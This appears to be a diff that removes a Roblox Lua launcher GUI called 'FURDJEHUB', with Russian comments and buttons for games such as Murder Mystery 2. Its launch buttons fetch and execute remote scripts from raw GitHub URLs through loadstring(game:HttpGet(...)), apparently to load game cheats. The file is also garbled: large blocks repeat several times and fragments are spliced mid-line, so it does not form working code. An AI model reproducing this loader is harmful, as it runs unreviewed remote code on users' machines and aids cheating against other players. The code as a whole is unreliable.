-    Icon.Font = Enum.Font.GothamBold
-    Icon.Parent = ModeFrame
-    
-    -- Название режима
-    local ModeLabel = Instance.new("TextLabel")
-    ModeLabel.Size = UDim2.new(0, 320, 1, 0)
-    ModeLabel.Position = UDim2.new(0, 60, 0, 0)
-    ModeLabel.BackgroundTransparency = 1
-    ModeLabel.Text = modeName
-    ModeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    ModeLabel.TextSize = 20
-    ModeLabel.TextXAlignment = Enum.TextXAlignment.Left
-    ModeLabel.Font = Enum.Font.Gotham
-    ModeLabel.Parent = ModeFrame
-    
-    -- Кнопка "Играть"
-    local PlayButton = Instance.new("TextButton")
-    PlayButton.Size = UDim2.new(0, 130, 0, 50)
-    PlayButton.Position = UDim2.new(1, -145, 0.5, -25)
-    PlayButton.BackgroundColor3 = color
-    PlayButton.BorderSizePixel = 0
-    PlayButton.Text = "▶ ИГРАТЬ"
-    PlayButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    PlayButton.TextSize = 16
-    PlayButton.Font = Enum.Font.GothamBold
-    PlayButton.Parent = ModeFrame
-    
-    local ButtonCorner = Instance.new("UICorner")
-    ButtonCorner.CornerRadius = UDim.new(0, 8)
-    ButtonCorner.Parent = PlayButton
-    
-    -- Эффект свечения кнопки
-    local Glow = Instance.new("Frame")
-    Glow.Size = UDim2.new(1, 0, 1, 0)
-    Glow.Position = UDim2.new(0, 0, 0, 0)
-    Glow.BackgroundColor3 = color
-    Glow.BackgroundTransparency = 0.7
-    Glow.BorderSizePixel = 0
-    Glow.ZIndex = 0
-    Glow.Parent = PlayButton
-    
-    local GlowCorner = Instance.new("UICorner")
-    GlowCorner.CornerRadius = UDim.new(0, 8)
-    GlowCorner.Parent = Glow
-    
-    -- Анимация наведения
-    local tweenService = game:GetService("TweenService")
-    
-    PlayButton.MouseEnter:Connect(function()
-        tweenService:Create(PlayButton, TweenInfo.new(0.2), {
-            BackgroundColor3 = Color3.fromRGB(
-                math.min(color.R * 255 + 40, 255),
-                math.min(color.G * 255 + 40, 255),
-                math.min(color.B * 255 + 40, 255)
-            )
-        }):Play()
-        tweenService:Create(ModeFrame, TweenInfo.new(0.2), {
-            BackgroundColor3 = Color3.fromRGB(45, 45, 70)
-        }):Play()
-    end)
-    
-    PlayButton.MouseLeave:Connect(function()
-        tweenService:Create(PlayButton, TweenInfo.new(0.2), {
-            BackgroundColor3 = color
-        }):Play()
-        tweenService:Create(ModeFrame, TweenInfo.new(0.2), {
-            BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-        }):Play()
-    end)
-    
-    -- Обработчик нажатия с уведомлением
-    PlayButton.MouseButton1Click:Connect(function()
-        local success, err = pcall(function()
-            loadstring(game:HttpGet(scriptUrl))()
-        end)
-        if not success then
-            warn("Ошибка загрузки: " .. tostring(err))
-        end
-    end)
-end
-
--- Создаем три режима с иконками
-CreateModeButton(75, "Murder Mystery 2", "https://raw.githubusercontent.com/colala8753-commits/furdjebu/main/mm2.lua", Color3.fromRGB(220, 50, 50), "🔪")
-CreateModeButton(165, "+1 Speed Keyboard Escape", "https://raw.githubusercontent.com/colala8753-commits/furdjebu/main/kbs", Color3.fromRGB(50, 150, 220), "⌨️")
-CreateModeButton(255, "Murder vs Sheriff Duels", "https://raw.githubusercontent.com/colala8753-commits/furdjebu/main/mvs", Color3.fromRGB(50, 200, 100), "⚔️")
-
--- Кнопка закрытия
-local CloseButton = Instance.new("TextButton")
-CloseButton.Size = UDim2.new(0, 35, 0, 35)
-CloseButton.Position = UDim2.new(1, -45, 0, 10)
-CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-CloseButton.BorderSizePixel = 0
-CloseButton.Text = "✕"
-CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseButton.TextSize = 20
-CloseButton.Font = Enum.Font.GothamBold
-CloseButton.Parent = Frame
-
-local CloseCorner = Instance.new("UICorner")
-CloseCorner.CornerRadius = UDim.new(1, 0)
-CloseCorner.Parent = CloseButton
-
-CloseButton.MouseButton1Click:Connect(function()
-    ScreenGui:Destroy()
-end)
-
--- Добавляем кнопку сворачивания
-local MinimizeButton = Instance.new("TextButton")
-MinimizeButton.Size = UDim2.new(0, 35, 0, 35)
-MinimizeButton.Position = UDim2.new(1, -90, 0, 10)
-MinimizeButton.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
-MinimizeButton.BorderSizePixel = 0
-MinimizeButton.Text = "−"
-MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-MinimizeButton.TextSize = 24
-MinimizeButton.Font = Enum.Font.GothamBold
-MinimizeButton.Parent = Frame
-
-local MinCorner = Instance.new("UICorner")
-MinCorner.CornerRadius = UDim.new(1, 0)
-MinCorner.Parent = MinimizeButton
-
-local minimized = false
-MinimizeButton.MouseButton1Click:Connect(function()
-    minimized = not minimized
-    if minimized then
-        Frame.Size = UDim2.new(0, 600, 0, 55)
-        MinimizeButton.Text = "+"
-    else
-        Frame.Size = UDim2.new(0, 600, 0, 450)
-        MinimizeButton.Text = "−"
-    end
-end)
-
--- Анимация появления
-Frame.BackgroundTransparency = 1
-for _, child in ipairs(Frame:GetChildren()) do
-    if child:IsA("Frame") and child ~= Shadow then
-        child.BackgroundTransparency = 1
-    end
-end
-
-tweenService:Create(Frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
-    BackgroundTransparency = 0
-}):Play()
-
-wait(0.1)
-for _, child in ipairs(Frame:GetChildren()) do
-    if child:IsA("Frame") and child ~= Shadow then
-        tweenService:Create(child, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
-            BackgroundTransparency = 0
-        }):Play()
-    end
-end
-
-print("✅ Furdjehub Loader успешно загружен!")        loadstring(game:HttpGet(scriptUrl))()
-    end)
-end
-
--- Создаем три режима
-CreateModeButton(70, "Murder Mystery 2", "https://raw.githubusercontent.com/colala8753-commits/furdjebu/main/mm2.lua", Color3.fromRGB(220, 50, 50))
-CreateModeButton(160, "+1 Speed Keyboard Escape", "https://raw.githubusercontent.com/colala8753-commits/furdjebu/main/kbs", Color3.fromRGB(50, 150, 220))
-CreateModeButton(250, "Murder vs Sheriff Duels", "https://raw.githubusercontent.com/colala8753-commits/furdjebu/main/mvs", Color3.fromRGB(50, 200, 100))
-
--- Кнопка закрытия
-local CloseButton = Instance.new("TextButton")
-CloseButton.Size = UDim2.new(0, 30, 0, 30)
-CloseButton.Position = UDim2.new(1, -40, 0, 10)
-CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-CloseButton.BorderSizePixel = 0
-CloseButton.Text = "X"
-CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseButton.TextSize = 18
-CloseButton.Font = Enum.Font.GothamBold
-CloseButton.Parent = Frame
-
-local CloseCorner = Instance.new("UICorner")
-CloseCorner.CornerRadius = UDim.new(1, 0)
-CloseCorner.Parent = CloseButton
-
-CloseButton.MouseButton1Click:Connect(function()
-    ScreenGui:Destroy()
-end)
-
-print("GUI загружен!") -- Для отладкиCloseButton.Size = UDim2.new(0, 30, 0, 30)
-CloseButton.Position = UDim2.new(1, -40, 0, 10)
-CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-CloseButton.BorderSizePixel = 0
-CloseButton.Text = "X"
-CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-CloseButton.TextSize = 18
-CloseButton.Font = Enum.Font.GothamBold
-CloseButton.Parent = Frame
-
-local CloseCorner = Instance.new("UICorner")
-CloseCorner.CornerRadius = UDim.new(1, 0)
-CloseCorner.Parent = CloseButton
-
-CloseButton.MouseButton1Click:Connect(function()
-    ScreenGui:Destroy()
-end)
-
--- Анимация появления
-Frame.BackgroundTransparency = 1
-game:GetService("TweenService"):Create(
-    Frame,
-    TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-    {BackgroundTransparency = 0.1}
-):Play()    label.Parent = frame
-
-    task.wait(2.5)
-    notif:Destroy()
-end
-
--- ===== СОЗДАНИЕ GUI =====
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FurdjehubLauncher2"
-screenGui.Parent = player:WaitForChild("PlayerGui")
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
--- Главное окно 600x420
-local window = Instance.new("Frame")
-window.Size = UDim2.new(0, 600, 0, 420)
-window.Position = UDim2.new(0.5, -300, 0.5, -210)
-window.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-window.BackgroundTransparency = 0
-window.BorderSizePixel = 0
-window.Parent = screenGui
-window.Visible = true
-window.Active = true
-window.Selectable = false
-
-local windowCorner = Instance.new("UICorner")
-windowCorner.CornerRadius = UDim.new(0, 10)
-windowCorner.Parent = window
-
--- Тень
-local shadow = Instance.new("Frame")
-shadow.Size = UDim2.new(1, 10, 1, 10)
-shadow.Position = UDim2.new(0, -5, 0, -5)
-shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-shadow.BackgroundTransparency = 0.5
-shadow.BorderSizePixel = 0
-shadow.ZIndex = -1
-shadow.Parent = window
-
--- Drag functionality
-local dragging = false
-local dragStart = nil
-local dragOffset = nil
-
--- Заголовок
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1, 0, 0, 45)
-titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-titleBar.BorderSizePixel = 0
-titleBar.Parent = window
-
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 10)
-titleCorner.Parent = titleBar
-
-local titleText = Instance.new("TextLabel")
-titleText.Size = UDim2.new(1, -80, 1, 0)
-titleText.Position = UDim2.new(0, 15, 0, 0)
-titleText.Text = "⚡ FURDJEHUB"
-titleText.TextColor3 = Color3.fromRGB(255, 200, 50)
-titleText.TextSize = 20
-titleText.Font = Enum.Font.GothamBold
-titleText.TextXAlignment = Enum.TextXAlignment.Left
-titleText.BackgroundTransparency = 1
-titleText.Parent = titleBar
-
--- Кнопка закрытия
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 35, 0, 35)
-closeBtn.Position = UDim2.new(1, -40, 0, 5)
-closeBtn.Text = "✕"
-closeBtn.TextSize = 16
-closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-closeBtn.BorderSizePixel = 0
-closeBtn.Parent = titleBar
-
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 6)
-closeCorner.Parent = closeBtn
-
-closeBtn.MouseEnter:Connect(function()
-    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-end)
-closeBtn.MouseLeave:Connect(function()
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-end)
-
-closeBtn.MouseButton1Click:Connect(function()
-    screenGui:Destroy()
-end)
-
--- Кнопка сворачивания
-local toggleBtn = Instance.new("TextButton")
-toggleBtn.Size = UDim2.new(0, 50, 0, 50)
-toggleBtn.Position = UDim2.new(0, 15, 0, 15)
-toggleBtn.Text = "⚡"
-toggleBtn.TextSize = 22
-toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-toggleBtn.BorderSizePixel = 0
-toggleBtn.Parent = screenGui
-toggleBtn.Visible = true
-toggleBtn.Selectable = false
-
-local toggleCorner = Instance.new("UICorner")
-toggleCorner.CornerRadius = UDim.new(0, 10)
-toggleCorner.Parent = toggleBtn
-
-toggleBtn.MouseButton1Click:Connect(function()
-    window.Visible = not window.Visible
-end)
-
--- Drag для заголовка
-titleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        dragOffset = window.Position
-    end
-end)
-
-titleBar.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local delta = input.Position - dragStart
-        window.Position = UDim2.new(dragOffset.X.Scale, dragOffset.X.Offset + delta.X, dragOffset.Y.Scale, dragOffset.Y.Offset + delta.Y)
-    end
-end)
-
--- Контент
-local content = Instance.new("Frame")
-content.Size = UDim2.new(1, -20, 1, -60)
-content.Position = UDim2.new(0, 10, 0, 55)
-content.BackgroundTransparency = 1
-content.Parent = window
-
--- Скроллинг
-local scrollFrame = Instance.new("ScrollingFrame")
-scrollFrame.Size = UDim2.new(1, 0, 1, 0)
-scrollFrame.BackgroundTransparency = 1
-scrollFrame.ScrollBarThickness = 6
-scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 85)
-scrollFrame.BorderSizePixel = 0
-scrollFrame.Parent = content
-
-local canvas = Instance.new("Frame")
-canvas.Size = UDim2.new(1, 0, 0, 0)
-canvas.BackgroundTransparency = 1
-canvas.Parent = scrollFrame
-
-local canvasY = 5
-
--- ===== СОЗДАНИЕ КНОПОК РЕЖИМОВ =====
-local function createModeButton(mode, index)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, -10, 0, 60)
-    btn.Position = UDim2.new(0, 5, 0, canvasY)
-    btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    btn.BorderSizePixel = 0
-    btn.Parent = canvas
-    btn.Selectable = false
-
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 8)
-    btnCorner.Parent = btn
-
-    -- Название
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Size = UDim2.new(1, -20, 0.5, 0)
-    nameLabel.Position = UDim2.new(0, 10, 0, 5)
-    nameLabel.Text = mode.Name
-    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    nameLabel.TextSize = 16
-    nameLabel.Font = Enum.Font.GothamBold
-    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Parent = btn
-
-    -- Описание
-    local descLabel = Instance.new("TextLabel")
-    descLabel.Size = UDim2.new(1, -20, 0.5, 0)
-    descLabel.Position = UDim2.new(0, 10, 0.5, 0)
-    descLabel.Text = mode.Description
-    descLabel.TextColor3 = Color3.fromRGB(150, 150, 180)
-    descLabel.TextSize = 12
-    descLabel.Font = Enum.Font.Gotham
-    descLabel.TextXAlignment = Enum.TextXAlignment.Left
-    descLabel.BackgroundTransparency = 1
-    descLabel.Parent = btn
-
-    -- Кнопка запуска
-    local launchBtn = Instance.new("TextButton")
-    launchBtn.Size = UDim2.new(0, 90, 0, 32)
-    launchBtn.Position = UDim2.new(1, -100, 0.5, -16)
-    launchBtn.Text = "▶ ЗАПУСК"
-    launchBtn.TextSize = 12
-    launchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    launchBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 70)
-    launchBtn.BorderSizePixel = 0
-    launchBtn.Parent = btn
-    launchBtn.Selectable = false
-
-    local launchCorner = Instance.new("UICorner")
-    launchCorner.CornerRadius = UDim.new(0, 6)
-    launchCorner.Parent = launchBtn
-
-    -- Статус
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(0, 80, 0, 20)
-    statusLabel.Position = UDim2.new(1, -190, 0.5, -10)
-    statusLabel.Text = "●"
-    statusLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-    statusLabel.TextSize = 20
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Font = Enum.Font.Gotham
-    statusLabel.Parent = btn
-
-    -- Ховер эффект
-    btn.MouseEnter:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(45, 45, 70)
-    end)
-    btn.MouseLeave:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    end)
-
-    -- Запуск
-    launchBtn.MouseButton1Click:Connect(function()
-        statusLabel.Text = "● ЗАГРУЗКА..."
-        statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
-
-        if mode.Script and mode.Script ~= "" then
-            screenGui:Destroy()
-            loadScript(mode.Script)
-        else
-            statusLabel.Text = "● НЕТ СКРИПТА"
-            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-            showNotification("⚠️ Скрипт для " .. mode.Name .. " не добавлен!", Color3.fromRGB(200, 150, 40))
-            task.wait(1.5)
-            statusLabel.Text = "●"
-            statusLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-        end
-    end)
-
-    canvasY = canvasY + 70
-    canvas.Size = UDim2.new(1, 0, 0, canvasY)
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, canvasY + 10)
-
-    return btn
-end
-
--- Создаем кнопки для всех режимов
-for i, mode in ipairs(Modes) do
-    createModeButton(mode, i)
-end
-
--- Информация внизу
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, -20, 0, 20)
-footer.Position = UDim2.new(0, 10, 1, -30)
-footer.Text = "FURDJEHUB v2.0 | Выбери режим и нажми ▶ ЗАПУСК"
-footer.TextColor3 = Color3.fromRGB(100, 100, 130)
-footer.TextSize = 11
-footer.BackgroundTransparency = 1
-footer.Font = Enum.Font.Gotham
-footer.Parent = content
-
-print("⚡ FURDJEHUB Launcher v2.0 loaded!")
-print("📌 Всего режимов: " .. #Modes)
-print("💡 Нажми ▶ ЗАПУСК для загрузки скрипта")    label.Parent = frame
-    
-    task.wait(2.5)
-    notif:Destroy()
-end
-
--- ===== СОЗДАНИЕ GUI =====
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FurdjehubLauncher2"
-screenGui.Parent = player:WaitForChild("PlayerGui")
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
--- Главное окно 600x420
-local window = Instance.new("Frame")
-window.Size = UDim2.new(0, 600, 0, 420)
-window.Position = UDim2.new(0.5, -300, 0.5, -210)
-window.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-window.BackgroundTransparency = 0
-window.BorderSizePixel = 0
-window.Parent = screenGui
-window.Visible = true
-window.Active = true
-window.Selectable = false
-
-local windowCorner = Instance.new("UICorner")
-windowCorner.CornerRadius = UDim.new(0, 10)
-windowCorner.Parent = window
-
--- Тень
-local shadow = Instance.new("Frame")
-shadow.Size = UDim2.new(1, 10, 1, 10)
-shadow.Position = UDim2.new(0, -5, 0, -5)
-shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-shadow.BackgroundTransparency = 0.5
-shadow.BorderSizePixel = 0
-shadow.ZIndex = -1
-shadow.Parent = window
-
--- Drag functionality
-local dragging = false
-local dragStart = nil
-local dragOffset = nil
-
--- Заголовок
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1, 0, 0, 45)
-titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-titleBar.BorderSizePixel = 0
-titleBar.Parent = window
-
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 10)
-titleCorner.Parent = titleBar
-
-local titleText = Instance.new("TextLabel")
-titleText.Size = UDim2.new(1, -80, 1, 0)
-titleText.Position = UDim2.new(0, 15, 0, 0)
-titleText.Text = "⚡ FURDJEHUB"
-titleText.TextColor3 = Color3.fromRGB(255, 200, 50)
-titleText.TextSize = 20
-titleText.Font = Enum.Font.GothamBold
-titleText.TextXAlignment = Enum.TextXAlignment.Left
-titleText.BackgroundTransparency = 1
-titleText.Parent = titleBar
-
--- Кнопка закрытия
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 35, 0, 35)
-closeBtn.Position = UDim2.new(1, -40, 0, 5)
-closeBtn.Text = "✕"
-closeBtn.TextSize = 16
-closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-closeBtn.BorderSizePixel = 0
-closeBtn.Parent = titleBar
-
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 6)
-closeCorner.Parent = closeBtn
-
-closeBtn.MouseEnter:Connect(function()
-    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
-end)
-closeBtn.MouseLeave:Connect(function()
-    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-end)
-
-closeBtn.MouseButton1Click:Connect(function()
-    screenGui:Destroy()
-end)
-
--- Кнопка сворачивания
-local toggleBtn = Instance.new("TextButton")
-toggleBtn.Size = UDim2.new(0, 50, 0, 50)
-toggleBtn.Position = UDim2.new(0, 15, 0, 15)
-toggleBtn.Text = "⚡"
-toggleBtn.TextSize = 22
-toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-toggleBtn.BorderSizePixel = 0
-toggleBtn.Parent = screenGui
-toggleBtn.Visible = true
-toggleBtn.Selectable = false
-
-local toggleCorner = Instance.new("UICorner")
-toggleCorner.CornerRadius = UDim.new(0, 10)
-toggleCorner.Parent = toggleBtn
-
-toggleBtn.MouseButton1Click:Connect(function()
-    window.Visible = not window.Visible
-end)
-
--- Drag для заголовка
-titleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        dragOffset = window.Position
-    end
-end)
-
-titleBar.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = false
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
-        local delta = input.Position - dragStart
-        window.Position = UDim2.new(dragOffset.X.Scale, dragOffset.X.Offset + delta.X, dragOffset.Y.Scale, dragOffset.Y.Offset + delta.Y)
-    end
-end)
-
--- Контент
-local content = Instance.new("Frame")
-content.Size = UDim2.new(1, -20, 1, -60)
-content.Position = UDim2.new(0, 10, 0, 55)
-content.BackgroundTransparency = 1
-content.Parent = window
-
--- Скроллинг
-local scrollFrame = Instance.new("ScrollingFrame")
-scrollFrame.Size = UDim2.new(1, 0, 1, 0)
-scrollFrame.BackgroundTransparency = 1
-scrollFrame.ScrollBarThickness = 6
-scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 85)
-scrollFrame.BorderSizePixel = 0
-scrollFrame.Parent = content
-
-local canvas = Instance.new("Frame")
-canvas.Size = UDim2.new(1, 0, 0, 0)
-canvas.BackgroundTransparency = 1
-canvas.Parent = scrollFrame
-
-local canvasY = 5
-
--- ===== СОЗДАНИЕ КНОПОК РЕЖИМОВ =====
-local function createModeButton(mode, index)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, -10, 0, 60)
-    btn.Position = UDim2.new(0, 5, 0, canvasY)
-    btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    btn.BorderSizePixel = 0
-    btn.Parent = canvas
-    btn.Selectable = false
-    
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 8)
-    btnCorner.Parent = btn
-    
-    -- Название
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Size = UDim2.new(1, -20, 0.5, 0)
-    nameLabel.Position = UDim2.new(0, 10, 0, 5)
-    nameLabel.Text = mode.Name
-    nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    nameLabel.TextSize = 16
-    nameLabel.Font = Enum.Font.GothamBold
-    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Parent = btn
-    
-    -- Описание
-    local descLabel = Instance.new("TextLabel")
-    descLabel.Size = UDim2.new(1, -20, 0.5, 0)
-    descLabel.Position = UDim2.new(0, 10, 0.5, 0)
-    descLabel.Text = mode.Description
-    descLabel.TextColor3 = Color3.fromRGB(150, 150, 180)
-    descLabel.TextSize = 12
-    descLabel.Font = Enum.Font.Gotham
-    descLabel.TextXAlignment = Enum.TextXAlignment.Left
-    descLabel.BackgroundTransparency = 1
-    descLabel.Parent = btn
-    
-    -- Кнопка запуска
-    local launchBtn = Instance.new("TextButton")
-    launchBtn.Size = UDim2.new(0, 90, 0, 32)
-    launchBtn.Position = UDim2.new(1, -100, 0.5, -16)
-    launchBtn.Text = "▶ ЗАПУСК"
-    launchBtn.TextSize = 12
-    launchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    launchBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 70)
-    launchBtn.BorderSizePixel = 0
-    launchBtn.Parent = btn
-    launchBtn.Selectable = false
-    
-    local launchCorner = Instance.new("UICorner")
-    launchCorner.CornerRadius = UDim.new(0, 6)
-    launchCorner.Parent = launchBtn
-    
-    -- Статус
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(0, 80, 0, 20)
-    statusLabel.Position = UDim2.new(1, -190, 0.5, -10)
-    statusLabel.Text = "●"
-    statusLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-    statusLabel.TextSize = 20
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Font = Enum.Font.Gotham
-    statusLabel.Parent = btn
-    
-    -- Ховер эффект
-    btn.MouseEnter:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(45, 45, 70)
-    end)
-    btn.MouseLeave:Connect(function()
-        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
-    end)
-    
-    -- Запуск
-    launchBtn.MouseButton1Click:Connect(function()
-        statusLabel.Text = "● ЗАГРУЗКА..."
-        statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
-        
-        if mode.Script and mode.Script \~= "" then
-            screenGui:Destroy()
-            loadScript(mode.Script)
-        else
-            statusLabel.Text = "● НЕТ СКРИПТА"
-            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-            showNotification("⚠️ Скрипт для " .. mode.Name .. " не добавлен!", Color3.fromRGB(200, 150, 40))
-            task.wait(1.5)
-            statusLabel.Text = "●"
-            statusLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-        end
-    end)
-    
-    canvasY = canvasY + 70
-    canvas.Size = UDim2.new(1, 0, 0, canvasY)
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, canvasY + 10)
-    
-    return btn
-end
-
--- Создаем кнопки для всех режимов
-for i, mode in ipairs(Modes) do
-    createModeButton(mode, i)
-end
-
--- Информация внизу
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, -20, 0, 20)
-footer.Position = UDim2.new(0, 10, 1, -30)
-footer.Text = "FURDJEHUB v2.0 | Выбери режим и нажми ▶ ЗАПУСК"
-footer.TextColor3 = Color3.fromRGB(100, 100, 130)
-footer.TextSize = 11
-footer.BackgroundTransparency = 1
-footer.Font = Enum.Font.Gotham
-footer.Parent = content
-
-print("⚡ FURDJEHUB Launcher v2.0 loaded!")
-print("📌 Всего режимов: " .. #Modes)
-print("💡 Нажми ▶ ЗАПУСК для загрузки скрипта")    label.Parent = frame
-    
-    task.wait(2.5)
-    notif:Destroy()
-end
-
--- ===== СОЗДАНИЕ GUI =====
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "FurdjehubLauncher2"
-screenGui.Parent = player:WaitForChild("PlayerGui")
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
--- Главное окно 600x420
-local window = Instance.new("Frame")
-window.Size = UDim2.new(0, 600, 0, 420)
-window.Position = UDim2.new(0.5, -300, 0.5, -210)
-window.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-window.BackgroundTransparency = 0
-window.BorderSizePixel = 0
-window.Parent = screenGui
-window.Visible = true
-window.Active = true
-window.Selectable = false
-
-local windowCorner = Instance.new("UICorner")
-windowCorner.CornerRadius = UDim.new(0, 10)
-windowCorner.Parent = window
-
--- Тень
-local shadow = Instance.new("Frame")
-shadow.Size = UDim2.new(1, 10, 1, 10)
-shadow.Position = UDim2.new(0, -5, 0, -5)
-shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-shadow.BackgroundTransparency = 0.5
-shadow.BorderSizePixel = 0
-shadow.ZIndex = -1
-shadow.Parent = window
-
--- Drag functionality
-local dragging = false
-local dragStart = nil
-local dragOffset = nil
-
--- Заголовок
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1, 0, 0, 45)
-titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
-titleBar.BorderSizePixel = 0
-titleBar.Parent = window
-
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 10)
-titleCorner.Parent = titleBar
-
-local titleText = Instance.new("TextLabel")
-titleText.Size = UDim2.new(1, -80, 1, 0)
-titleText.Position = UDim2.new(0, 15, 0, 0)
-titleText.Text = "⚡ FURDJEHUB"
-titleText.TextColor3 = Color3.fromRGB(255, 200, 50)
-titleText.TextSize = 20
-titleText.Font = Enum.Font.GothamBold
-titleText.TextXAlignment = Enum.TextXAlignment.Left
-titleText.BackgroundTransparency = 1
-titleText.Parent = titleBar
-
--- Кнопка закрытия
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 35, 0, 35)
-closeBtn.Position = UDim2.new(1, -40, 0, 5)
-closeBtn.Text = "✕"
-closeBtn.TextSize = 16
-closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
-closeBtn.BorderSizePixel = 0
-closeBtn.Parent = titleBar
-
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 6)
